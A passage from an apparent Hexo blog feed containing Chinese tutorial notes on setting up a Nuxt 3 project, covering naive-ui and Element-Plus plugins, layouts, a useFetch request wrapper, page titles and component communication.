&#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="1-5-自定义全局loading"><a href="#1-5-自定义全局loading" class="headerlink" title="1.5 自定义全局loading"></a>1.5 自定义全局loading</h3><p>在plugins中创建globalloading.js文件，在生命周期hook函数中加载loading条</p><p>loadingBar设置参考naive-ui的独立API设置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123;<br>  createDiscreteApi<br>&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;naive-ui&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineNuxtPlugin</span>(<span class="hljs-function">(<span class="hljs-params">nuxtApp</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> bar = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)<br>  nuxtApp.<span class="hljs-title function_">hook</span>(<span class="hljs-string">&quot;app:mounted&quot;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!bar.<span class="hljs-property">value</span>) &#123;<br>      <span class="hljs-keyword">const</span> &#123; loadingBar &#125; = <span class="hljs-title function_">createDiscreteApi</span>([<span class="hljs-string">&quot;loadingBar&quot;</span>])<br>      bar.<span class="hljs-property">value</span> = loadingBar<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;app:mounted&quot;</span>)<br>  &#125;)<br>  nuxtApp.<span class="hljs-title function_">hook</span>(<span class="hljs-string">&quot;page:start&quot;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>    bar.<span class="hljs-property">value</span>?.<span class="hljs-title function_">start</span>()<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;page:start&quot;</span>)<br>  &#125;)<br>  nuxtApp.<span class="hljs-title function_">hook</span>(<span class="hljs-string">&quot;page:finish&quot;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      bar.<span class="hljs-property">value</span>?.<span class="hljs-title function_">finish</span>()<br>    &#125;, <span class="hljs-number">150</span>)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;page:finish&quot;</span>)<br>  &#125;)<br>  nuxtApp.<span class="hljs-title function_">hook</span>(<span class="hljs-string">&quot;app:error&quot;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (process.<span class="hljs-property">client</span>) &#123;<br>      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>        bar.<span class="hljs-property">value</span>?.<span class="hljs-title function_">finish</span>()<br>      &#125;, <span class="hljs-number">150</span>)<br>    &#125;<br>  &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><h2 id="2-全局Layout布局"><a href="#2-全局Layout布局" class="headerlink" title="2. 全局Layout布局"></a>2. 全局Layout布局</h2><h3 id="2-1-主布局实现"><a href="#2-1-主布局实现" class="headerlink" title="2.1 主布局实现"></a>2.1 主布局实现</h3><ol><li><p>修改app.vue页面，用NuxtLayout包裹NuxtPage，并禁用inline主题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;NConfigProvider inline-theme-disabled&gt;<br>    &lt;NuxtLayout&gt;<br>      &lt;NuxtPage/&gt;<br>    &lt;/NuxtLayout&gt;<br>  &lt;/NConfigProvider&gt;<br>&lt;/template&gt;<br><br>&lt;script setup&gt;<br>import &#123;<br>  NConfigProvider<br>&#125; from &quot;naive-ui&quot;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></li><li><p>根目录创建layouts文件夹，创建default.vue文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class=&quot;body&quot;&gt;<br>    &lt;NavBar/&gt;<br>    &lt;slot/&gt;<br>    &lt;PageFooter/&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure></li><li><p>根目录创建components文件夹，创建导航栏与页脚两个组件</p></li></ol><h3 id="2-2-引入全局css"><a href="#2-2-引入全局css" class="headerlink" title="2.2 引入全局css"></a>2.2 引入全局css</h3><p>保证每个页面的左右边距一致</p><ol><li><p>在根目录下创建assets文件夹，创建main.css文件</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">1140px</span>;<br>  <span class="hljs-attribute">padding-left</span>: <span class="hljs-number">15px</span>;<br>  <span class="hljs-attribute">padding-right</span>: <span class="hljs-number">15px</span>;<br>  <span class="hljs-attribute">margin-left</span>: auto;<br>  <span class="hljs-attribute">margin-right</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在nuxt.config.ts文件中引入css</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-attr">css</span>: [<br>    <span class="hljs-string">&quot;@/assets/main.css&quot;</span><br>],<br></code></pre></td></tr></table></figure></li><li><p>更改default.vue页面，加入container样式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class=&quot;body&quot;&gt;<br>    &lt;NavBar/&gt;<br>    &lt;main class=&quot;container&quot;&gt;<br>      &lt;slot/&gt;<br>    &lt;/main&gt;<br>    &lt;PageFooter/&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure></li></ol><h3 id="2-3-引入图标库"><a href="#2-3-引入图标库" class="headerlink" title="2.3 引入图标库"></a>2.3 引入图标库</h3><ol><li><p>安装图标</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> i -D @vicons/ionicons5<br></code></pre></td></tr></table></figure></li><li><p>在vue中引入import</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;script setup&gt;<br>import &#123;<br>  NIcon<br>&#125; from &quot;naive-ui&quot;<br>import &#123;<br>  Search<br>&#125; from &quot;@vicons/ionicons5&quot;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></li></ol><h3 id="2-4-公共头部开发"><a href="#2-4-公共头部开发" class="headerlink" title="2.4 公共头部开发"></a>2.4 公共头部开发</h3><p>修改components&#x2F;NavBar组件，设置不同的css样式</p><ol><li><p>左侧logo采用NButton制作</p></li><li><p>中间偏左为导航菜单栏</p></li><li><p>右侧为搜索与登陆按钮</p><ol><li>搜索采用带图标的button组件</li><li>用户头像登陆按钮采用NDropdown组件</li></ol></li></ol><h3 id="2-5-动态路由"><a href="#2-5-动态路由" class="headerlink" title="2.5 动态路由"></a>2.5 动态路由</h3><p>动态路由跳转页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;div class=&quot;menu&quot;&gt;<br>    &lt;div class=&quot;menu-item&quot; v-for=&quot;(item, index) in menus&quot; :key=&quot;index&quot; :class=&quot;&#123;&#x27;menu-item-active&#x27;: (route.path == item.path)&#125;&quot; @click=&quot;handleOpen(item.path)&quot;&gt;&#123;&#123; item.name &#125;&#125;&lt;/div&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><p>在pages下创建页面时，需要遵循一定规则</p><ul><li>带有中括号表示是动态路由</li><li>menus中的path路径属性与pages中的文件目录及文件一一对应</li></ul><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20230126214254731.png" alt="image-20230126214254731"></p><h3 id="2-6-组件封装"><a href="#2-6-组件封装" class="headerlink" title="2.6 组件封装"></a>2.6 组件封装</h3><ol><li><p>通过插槽slot代表需要存放的内容</p></li><li><p>通过defineProps定义组件中传递进来的参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">defineProps</span>(&#123;<br>  <span class="hljs-attr">active</span>: &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-title class_">Boolean</span>,<br>    <span class="hljs-attr">default</span>: <span class="hljs-literal">false</span><br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure></li></ol><h3 id="2-7-引入Element-Plus以及图标库"><a href="#2-7-引入Element-Plus以及图标库" class="headerlink" title="2.7 引入Element-Plus以及图标库"></a>2.7 引入Element-Plus以及图标库</h3><ol><li><p>安装相应库</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> install sass element-plus @element-plus/icons-vue unplugin-vue-components unplugin-auto-<span class="hljs-keyword">import</span> --save<br></code></pre></td></tr></table></figure></li><li><p>在assets&#x2F;index.scss中加入如下内容，放置到首行</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@use</span> <span class="hljs-string">&quot;element-plus/dist/index.css&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p>在plugins下创建 <code>element-plus.client.js</code> 文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">ElementPlus</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-plus/dist/index.full&#x27;</span><br><span class="hljs-keyword">import</span> zhCn <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-plus/es/locale/lang/zh-cn&#x27;</span><br> <br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineNuxtPlugin</span>(<span class="hljs-function">(<span class="hljs-params">nuxtApp</span>) =&gt;</span> &#123;<br>  nuxtApp.<span class="hljs-property">vueApp</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">ElementPlus</span>, &#123;<br>    <span class="hljs-attr">locale</span>: zhCn,<br>  &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>修改 <code>nuxt.config.ts</code> 如下</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-comment">// https://v3.nuxtjs.org/api/configuration/nuxt.config</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineNuxtConfig</span>(&#123;<br>  <span class="hljs-attr">css</span>: [<br>    <span class="hljs-string">&#x27;element-plus/dist/index.css&#x27;</span>,<br>    <span class="hljs-string">&quot;~/assets/main.scss&quot;</span><br>  ],<br>  <span class="hljs-attr">modules</span>: [<br>    <span class="hljs-string">&#x27;nuxt-windicss&#x27;</span>,<br>  ],<br>  <span class="hljs-attr">build</span>: &#123;<br>    <span class="hljs-attr">transpile</span>:<br>      [<br>        <span class="hljs-string">&#x27;naive-ui&#x27;</span>,<br>        <span class="hljs-string">&#x27;vueuc&#x27;</span>,<br>        <span class="hljs-string">&#x27;@css-render/vue3-ssr&#x27;</span>,<br>        <span class="hljs-string">&#x27;@juggle/resize-observer&#x27;</span>,<br>        <span class="hljs-string">&quot;element-plus&quot;</span><br>      ]<br>  &#125;,<br>  <span class="hljs-attr">vite</span>: &#123;<br>    <span class="hljs-attr">optimizeDeps</span>: &#123;<br>      <span class="hljs-attr">include</span>: [<span class="hljs-string">&#x27;date-fns-tz/esm/formatInTimeZone&#x27;</span>]<br>    &#125;<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>在对应的vue中按需引入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vue">import &#123; ElButton, ElIcon &#125; from &quot;element-plus&quot;;<br>import &#123; Star &#125; from &quot;@element-plus/icons-vue&quot;;<br></code></pre></td></tr></table></figure></li></ol><h2 id="3-前后端数据交互"><a href="#3-前后端数据交互" class="headerlink" title="3. 前后端数据交互"></a>3. 前后端数据交互</h2><h3 id="3-1-未封装前"><a href="#3-1-未封装前" class="headerlink" title="3.1 未封装前"></a>3.1 未封装前</h3><p>采用useFetch方法调用接口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123;<br>  pending,<br>  data,<br>  refresh,<br>  error<br>&#125; = <span class="hljs-keyword">await</span> <span class="hljs-title function_">useFetch</span>(<span class="hljs-string">&quot;/index&quot;</span>, &#123;<br>  <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;IndexData&quot;</span>,<br>  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">&quot;http://demonuxtapi.dishait.cn/pc&quot;</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-attr">appid</span>: <span class="hljs-string">&quot;bd9d01ecc75dbbaaefce&quot;</span><br>  &#125;,<br>  <span class="hljs-comment">// 响应之前的数据处理</span><br>  <span class="hljs-attr">transform</span>: <span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-property">data</span><br>  &#125;,<br>  <span class="hljs-comment">// 是否开启缓存</span><br>  <span class="hljs-attr">initialCache</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-comment">// 懒加载</span><br>  <span class="hljs-attr">lazy</span>: <span class="hljs-literal">true</span><br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="3-2-请求和响应拦截器封装"><a href="#3-2-请求和响应拦截器封装" class="headerlink" title="3.2 请求和响应拦截器封装"></a>3.2 请求和响应拦截器封装</h3><p>创建composables文件夹，在其中创建useHttp.js文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fetchConfig = &#123;<br>  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">&quot;http://demonuxtapi.dishait.cn/pc&quot;</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-attr">appid</span>: <span class="hljs-string">&quot;bd9d01ecc75dbbaaefce&quot;</span><br>  &#125;,<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useGetFetchOptions</span>(<span class="hljs-params">options = &#123;&#125;</span>) &#123;<br>  options.<span class="hljs-property">baseURL</span> = options.<span class="hljs-property">baseURL</span> ?? fetchConfig.<span class="hljs-property">baseURL</span><br>  options.<span class="hljs-property">headers</span> = options.<span class="hljs-property">headers</span> ?? &#123;<br>    <span class="hljs-attr">appid</span>: fetchConfig.<span class="hljs-property">appid</span><br>  &#125;<br>  options.<span class="hljs-property">initalCache</span> = options.<span class="hljs-property">initialCache</span> ?? <span class="hljs-literal">false</span><br>  options.<span class="hljs-property">lazy</span> = options.<span class="hljs-property">lazy</span> ?? <span class="hljs-literal">false</span><br><br>  <span class="hljs-comment">// 用户登陆，默认传token</span><br>  <span class="hljs-keyword">return</span> options<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useHttp</span>(<span class="hljs-params">key, url, options = &#123;&#125;</span>) &#123;<br>  options = <span class="hljs-title function_">useGetFetchOptions</span>(options)<br>  options.<span class="hljs-property">key</span> = key<br>  <span class="hljs-keyword">let</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">useFetch</span>(url, &#123;<br>    ...options,<br>    <span class="hljs-comment">// 相当于响应拦截器</span><br>    <span class="hljs-attr">transform</span>: <span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-property">data</span><br>    &#125;<br>  &#125;)<br>  <span class="hljs-comment">// 错误处理</span><br>  <span class="hljs-keyword">return</span> res<br>&#125;<br><br><span class="hljs-comment">// Get请求</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useHttpGet</span>(<span class="hljs-params">key, url, options = &#123;&#125;</span>) &#123;<br>  options.<span class="hljs-property">method</span> = <span class="hljs-string">&#x27;GET&#x27;</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useHttp</span>(key, url, options)<br>&#125;<br><br><span class="hljs-comment">// POST请求</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useHtppPost</span>(<span class="hljs-params">key, url, options = &#123;&#125;</span>) &#123;<br>  options.<span class="hljs-property">method</span> = <span class="hljs-string">&#x27;POST&#x27;</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useHttp</span>(key, url, options)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-自定义全局方法"><a href="#4-自定义全局方法" class="headerlink" title="4. 自定义全局方法"></a>4. 自定义全局方法</h2><ol><li><p>在plugins目录下新建tools.js文件</p></li><li><p>定义方法：commonOpen</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineNuxtPlugin</span>(<span class="hljs-function">(<span class="hljs-params">nuxtApp</span>) =&gt;</span> &#123;<br>  nuxtApp.<span class="hljs-title function_">provide</span>(<span class="hljs-string">&quot;commonOpen&quot;</span>, <span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span>(item.<span class="hljs-property">type</span> == <span class="hljs-string">&#x27;webview&#x27;</span>) &#123;<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(item.<span class="hljs-property">url</span>)<br>    &#125;<br>  &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>调用：$开头</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">@click=<span class="hljs-string">&quot;$commonOpen(item)&quot;</span><br></code></pre></td></tr></table></figure></li></ol><p>定义插件之后需要重启页面</p><h2 id="5-页面标题设置"><a href="#5-页面标题设置" class="headerlink" title="5. 页面标题设置"></a>5. 页面标题设置</h2><ol><li><p>全局标题：在nuxt.config.js中配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">app</span>: &#123;<br>  <span class="hljs-attr">head</span>: &#123;<br>    <span class="hljs-attr">titleTemplate</span>: <span class="hljs-string">&#x27;%s - 帝莎编程&#x27;</span>, <span class="hljs-comment">// 所有页面标题模板</span><br>    <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;帝莎编程&#x27;</span>,<br>    <span class="hljs-attr">charset</span>: <span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>    <span class="hljs-attr">htmlAttrs</span>: &#123;<br>      <span class="hljs-attr">lang</span>: <span class="hljs-string">&quot;zh-cn&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">meta</span>: [<br>      &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;description&#x27;</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">&#x27;帝莎编程描述&#x27;</span> &#125;,<br>      &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;keywords&#x27;</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">&#x27;帝莎编程关键词&#x27;</span> &#125;<br>    ],<br>    <span class="hljs-attr">script</span>: [<br>      <span class="hljs-comment">// &#123; src: &quot;http://xxx.js&quot; &#125;</span><br>    ],<br>    <span class="hljs-attr">link</span>: [<br>      <span class="hljs-comment">// &#123; rel: &quot;stylesheet&quot;, href: &quot;http://xxx.css&quot; &#125;</span><br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>页面标题：在对应的vue-script中配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">useHead</span>(&#123;<br>  <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;帝莎编程首页&#x27;</span><br>&#125;)<br></code></pre></td></tr></table></figure></li></ol><h2 id="6-父子组件通信"><a href="#6-父子组件通信" class="headerlink" title="6. 父子组件通信"></a>6. 父子组件通信</h2><h3 id="6-1-父传子"><a href="#6-1-父传子" class="headerlink" title="6.1 父传子"></a>6.1 父传子</h3><ol><li><p>父组件在子组件上标记ref</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">SearchBar</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;SearchBarRef&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">SearchBar</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>父组件定义方法，调用子组件内的方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">SearchBarRef</span> = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">openSearch</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title class_">SearchBarRef</span>.<span class="hljs-property">value</span>.<span class="hljs-title function_">open</span>() <span class="hljs-comment">// 按钮点击调用openSearch</span><br></code></pre></td></tr></table></figure></li><li><p>子组件定义被ref调用的方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">open</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  keyword.<span class="hljs-property">value</span> = <span class="hljs-string">&quot;&quot;</span><br>  drawer.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>注意：vue3内通过ref定义的const常量，需要通过.value获取值和修改值</p><h2 id="7-指定页面布局"><a href="#7-指定页面布局" class="headerlink" title="7. 指定页面布局"></a>7. 指定页面布局</h2><p>某些页面不使用default布局，而是自定义另外的布局</p><p>在这些页面的script中加入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">definePageMeta</span>(&#123;<br>  <span class="hljs-attr">layout</span>: <span class="hljs-string">&#x27;login&#x27;</span><br>&#125;)<br></code></pre></td></tr></table></figure><h2 id="8-CSS不可复制"><a href="#8-CSS不可复制" class="headerlink" title="8. CSS不可复制"></a>8. CSS不可复制</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<br>  -webkit-user-select: none; <br>-ms-user-select: none;<br>-moz-user-select: none;<br>-khtml-user-select: none;<br>user-select: none;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vue</tag>
      
      <tag>Nuxt</tag>
      
      <tag>css</tag>
      
      <tag>html</tag>
      
      <tag>js</tag>
      
      <tag>SSR</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分布式缓存笔记</title>
    <link href="/2023/01/07/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/01/07/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98%E7%AC%94%E8%AE%B0/</url>
    
